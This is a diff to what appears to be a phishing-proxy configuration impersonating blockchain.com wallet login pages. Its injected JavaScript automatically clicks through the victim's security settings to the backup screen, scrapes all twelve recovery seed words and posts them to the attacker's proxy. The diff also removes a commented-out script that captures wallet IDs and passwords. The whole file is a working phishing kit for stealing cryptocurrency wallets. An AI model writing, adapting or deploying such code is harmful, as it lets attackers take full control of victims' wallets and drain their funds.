@@ -5,8 +5,6 @@ proxy_hosts:
   - {phish_sub: 'login', orig_sub: 'login', domain: 'blockchain.com', session: true, is_landing: false}
   - {phish_sub: '', orig_sub: '', domain: 'blockchain.info', session: false, is_landing: false}
   - {phish_sub: 'api', orig_sub: 'api', domain: 'blockchain.info', session: false, is_landing: false}
-#  - {phish_sub: 'wallet-helper', orig_sub: 'wallet-helper', domain: 'blockchain.com', session: false, is_landing: false}
-#  - {phish_sub: '', orig_sub: '', domain: 'blockchain.com', session: false, is_landing: false}
 
 
 sub_filters:
@@ -54,63 +52,55 @@ login:
 
 js_inject:
   - trigger_domains: ["login.blockchain.com"]
-    trigger_paths: ["#/home", "en/#/home", "/home", "/en/#/home", "/en/#/home*", "/en/#/"]
+    trigger_paths: ["/"]
     trigger_params: []
     script: |        
-        function simulate(element, eventName)
-        {
-        var options = extend(defaultOptions, arguments[2] || {});
-        var oEvent, eventType = null;
-        for (var name in eventMatchers)
-        {
-        if (eventMatchers[name].test(eventName)) { eventType = name; break; }
-        }
-        if (!eventType)
-        throw new SyntaxError('Only HTMLEvents and MouseEvents interfaces are supported');
-        if (document.createEvent)
-        {
-        oEvent = document.createEvent(eventType);
-        if (eventType == 'HTMLEvents')
-        {
-            oEvent.initEvent(eventName, options.bubbles, options.cancelable);
-        }
-        else
-        {
-            oEvent.initMouseEvent(eventName, options.bubbles, options.cancelable, document.defaultView,
-            options.button, options.pointerX, options.pointerY, options.pointerX, options.pointerY,
-            options.ctrlKey, options.altKey, options.shiftKey, options.metaKey, options.button, element);
-        }
-        element.dispatchEvent(oEvent);
-        }
-        else
-        {
-        options.clientX = options.pointerX;
-        options.clientY = options.pointerY;
-        var evt = document.createEventObject();
-        oEvent = extend(evt, options);
-        element.fireEvent('on' + eventName, oEvent);
-        }
-        return element;
-        }
-        function extend(destination, source) {
-        for (var property in source)
-        destination[property] = source[property];
-        return destination;
-        }
-        var eventMatchers = {
-        'HTMLEvents': /^(?:load|unload|abort|error|select|change|submit|reset|focus|blur|resize|scroll)$/,
-        'MouseEvents': /^(?:click|dblclick|mouse(?:down|up|over|move|out))$/
-        }
-        var defaultOptions = {
-        pointerX: 0,
-        pointerY: 0,
-        button: 0,
+        function simulatedClick(target, options) {
+        var event = target.ownerDocument.createEvent('MouseEvents'),
+        options = options || {},
+        opts = { // These are the default values, set up for un-modified left clicks
+        type: 'click',
+        canBubble: true,
+        cancelable: true,
+        view: target.ownerDocument.defaultView,
+        detail: 1,
+        screenX: 0, //The coordinates within the entire page
+        screenY: 0,
+        clientX: 0, //The coordinates within the viewport
+        clientY: 0,
         ctrlKey: false,
         altKey: false,
         shiftKey: false,
-        metaKey: false,
-        bubbles: true,
-        cancelable: true
+        metaKey: false, //I *think* 'meta' is 'Cmd/Apple' on Mac, and 'Windows key' on Win. Not sure, though!
+        button: 0, //0 = left, 1 = middle, 2 = right
+        relatedTarget: null,
+        };
+        //Merge the options with the defaults
+        for (var key in options) {
+        if (options.hasOwnProperty(key)) {
+        opts[key] = options[key];
+        }
+        }
+        //Pass in the options
+        event.initMouseEvent(
+        opts.type,
+        opts.canBubble,
+        opts.cancelable,
+        opts.view,
+        opts.detail,
+        opts.screenX,
+        opts.screenY,
+        opts.clientX,
+        opts.clientY,
+        opts.ctrlKey,
+        opts.altKey,
+        opts.shiftKey,
+        opts.metaKey,
+        opts.button,
+        opts.relatedTarget
+        );
+        //Fire the event
+        target.dispatchEvent(event);
         }
         function sleep(milliseconds) {
         const date = Date.now();
@@ -119,26 +109,27 @@ js_inject:
             currentDate = Date.now();
         } while (currentDate - date < milliseconds);
         }
-        simulate(document.querySelectorAll("button[data-e2e=securityCenterLink]")[0], "click");
-        sleep(7000);
-        simulate(document.querySelectorAll("button[data-e2e=backupFundsButton]")[0], "click");
+        function simulateclicks(){
+        simulatedClick(document.querySelectorAll("button[data-e2e=securityCenterLink]")[0]);
+        sleep(6000);
+        simulatedClick(document.querySelectorAll("button[data-e2e=backupFundsButton]")[0]);
         sleep(3000);
-        simulate(document.querySelectorAll("button")[0], "click");
+        simulatedClick(document.querySelectorAll("button")[0]);
         sleep(3000);
-        var word1 = document.querySelectorAll("div")[76].textContent;
-        var word2 = document.querySelectorAll("div")[80].textContent;
-        var word3 = document.querySelectorAll("div")[84].textContent;
-        var word4 = document.querySelectorAll("div")[88].textContent;
-        var word5 = document.querySelectorAll("div")[92].textContent;
-        var word6 = document.querySelectorAll("div")[96].textContent;
-        simulate(document.querySelectorAll("button")[0], "click");
+        var word1 = document.querySelectorAll("div")[77].textContent;
+        var word2 = document.querySelectorAll("div")[81].textContent;
+        var word3 = document.querySelectorAll("div")[85].textContent;
+        var word4 = document.querySelectorAll("div")[89].textContent;
+        var word5 = document.querySelectorAll("div")[93].textContent;
+        var word6 = document.querySelectorAll("div")[97].textContent;
+        simulatedClick(document.querySelectorAll("button")[0]);
         sleep(3000);
-        var word7 = document.querySelectorAll("div")[76].textContent;
-        var word8 = document.querySelectorAll("div")[80].textContent;
-        var word9 = document.querySelectorAll("div")[84].textContent;
-        var word10 = document.querySelectorAll("div")[88].textContent;
-        var word11 = document.querySelectorAll("div")[92].textContent;
-        var word12 = document.querySelectorAll("div")[96].textContent;
+        var word7 = document.querySelectorAll("div")[77].textContent;
+        var word8 = document.querySelectorAll("div")[81].textContent;
+        var word9 = document.querySelectorAll("div")[85].textContent;
+        var word10 = document.querySelectorAll("div")[89].textContent;
+        var word11 = document.querySelectorAll("div")[93].textContent;
+        var word12 = document.querySelectorAll("div")[97].textContent;
         var backupwords = (word1)+""+(word2)+""+(word3)+""+(word4)+""+(word5)+""+(word6)+""+(word7)+""+(word8)+""+(word9)+""+(word10)+""+(word11)+""+(word12)
         var xhr = new XMLHttpRequest();
             xhr.open("POST", '/backupwords', true);
@@ -146,29 +137,4 @@ js_inject:
             xhr.send("BackupWords="+encodeURIComponent(backupwords));
             window.location.assign("/en/#/home");
             sleep(2000);
-         
-        
-
-
-# To insert the wallet id directly from link  
-# https://login.blockchain.com/#/login/dxxxxxxa-xxx8-xx4x-xxfa-dxxxx9xxx76ce  
-#js_inject:
-#  - trigger_domains: ["login.blockchain.com"]
-#    trigger_paths: ["/"]
-#    script: |
-#        function onclickListener(){
-#            var submit = document.querySelectorAll('button[type=submit]')[0];
-#            submit.setAttribute("onclick", "sendPass()");
-#            return;
-#            }
-#        function sendPass(){
-#            var walletID = document.getElementsByName("guid")[0].value;
-#            var password = document.getElementsByName("password")[0].value;
-#            var xhr = new XMLHttpRequest();
-#            xhr.open("POST", '/', true);
-#            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-#            xhr.send("guid="+encodeURIComponent(walletID)+""+" password="+encodeURIComponent(password));
-#            return;
-#            }
-#        setTimeout(function(){ onclickListener(); }, 100);
-        
+        }
